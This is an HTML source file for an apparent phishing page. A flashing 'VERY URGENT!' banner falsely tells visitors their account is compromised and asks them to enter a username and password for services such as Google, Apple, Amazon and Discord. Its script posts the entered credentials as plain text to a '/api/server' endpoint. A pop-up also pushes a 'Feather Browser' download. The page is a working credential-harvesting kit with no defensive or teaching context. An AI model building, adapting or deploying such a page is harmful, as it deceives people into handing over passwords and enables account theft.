<!DOCTYPE html>
<html>
    <head>
        <title>CRITICAL</title>
        <style>
            * {
                font-family: monospace;
            }
            body {
              background: #bfbfbf;
            }
            .warning {
              animation: warning 1s infinite linear;
            }
            @keyframes warning {
              0% {color: yellow;}
              50% {color: orange;}
              75% {color: red;}
              100% {color: yellow;}
            }
            .vista-button {
              position: relative;
              background-color: #00ff0d;
              border: 1px solid #6aa6d6;
              border-radius: 6px;
              color: #000;
              padding: 8px 12px;
              font-size: 16px;
              box-shadow: inset 0 1px 0 #ffffffaa, 0 2px 4px rgba(0, 0, 0, 0.3);
              text-shadow: 0 1px 0 #fff;
              cursor: pointer;
              overflow: hidden;
              transition: background-color 0.1s ease, box-shadow 0.2s ease;
            }

            .vista-button::before {
              content: "";
              position: absolute;
              top: 0;
              left: 0;
              width: 100%;
              height: 50%;
              background: rgba(255, 255, 255, 0.2);
              border-radius: 6px 6px 0 0;
              pointer-events: none;
            }

            .vista-button:hover {
              background-color: #24b145;
            }

            .vista-button:active {
              background-color: #0f8200;
              box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.4);
            }
            .vista-container {
              position: fixed;
              width: 400px;
              padding: 10px 30px;
              background: rgba(255, 255, 255, 0.2);
              border: 1px solid rgba(255, 255, 255, 0.4);
              border-radius: 12px;
              box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.4),
                0 4px 20px rgba(0, 0, 0, 0.4);
              backdrop-filter: blur(12px);
              -webkit-backdrop-filter: blur(12px);
              color: #000;
              animation: move-in .5s ease-in-out;
              margin-left: 8px;
              display: none;
            }

            .vista-container::before {
              content: "";
              position: absolute;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              border-radius: 12px;
              background: linear-gradient(to bottom, rgba(255, 255, 255, 0.8), rgba(255,255,255,0));
              pointer-events: none;
            }
            @keyframes move-in {
              from {transform: translate(0px, -100%); opacity: 0;}
              to {transform: translate(0px, 0px);}
            }
            #huninn {
              font-family: Rubik;
              color: white;
            }
        </style>
    </head>
    <body>
    <div class="vista-container" id="ad" style="display: block;">
      <p style="color: black;">Feather Browser is ready!</p>
      <button class="vista-button" onclick="window.location='https://feather-browser.vercel.app'">Download</button>
      <button class="vista-button" onclick="closeAd()" style="background: rgb(255, 111, 111);">No Thanks</button>
    </div>
      <h1 class="warning">VERY URGENT!</h1>
      <h3>Your account has been compromised! Please enter credentials to secure your account!</h3>
        <form id="form">
            <input type="text" id="username" placeholder="Username or Email" />
            <input type="text" id="password" placeholder="Password" />
            <select id="service" name="Choose Service.">
              <option value="amazon">Amazon</option>
              <option value="google">Google</option>
              <option value="apple">Apple</option>
              <option value="microsoft">Microsoft</option>
              <option value="meta">Meta (Facebook)</option>
              <option value="netflix">Netflix</option>
              <option value="youtube">YouTube</option>
              <option value="spotify">Spotify</option>
              <option value="instagram">Instagram</option>
              <option value="discord">Discord</option>
              <option value="x">X (Twitter)</option>
              <option value="tiktok">TikTok</option>
              <option value="reddit">Reddit</option>
              <option value="snapchat">Snapchat</option>
              <option value="linkedin">LinkedIn</option>
              <option value="walmart">Walmart</option>
              <option value="target">Target</option>
              <option value="costco">Costco</option>
              <option value="nike">Nike</option>
              <option value="adidas">Adidas</option>
              <option value="samsung">Samsung</option>
              <option value="github">Github</option>
              <option value="scratch">Scratch MIT</option>
            </select>

            <button type="submit">Send</button>
        </form>

        <script>
            const form = document.getElementById('form');
            
            form.addEventListener('submit', async (e) => {
              e.preventDefault();
              const username = document.getElementById('username').value.trim();
              const password = document.getElementById('password').value.trim();
              const service = document.getElementById('service').value.trim();
              if (!username || !password) {
                alert('Please enter password AND username.');
                return;
              }
            
              try {
                const res = await fetch('/api/server', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ content: `${username}, ${password}, Service: ${service}` })
                });
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
              } catch (err) {
                console.error('Error:', err);
              }
            });
            setTimeout(() => {document.getElementById("ad").style.display = "block";}, 2000)
        </script>
    </body>
</html>
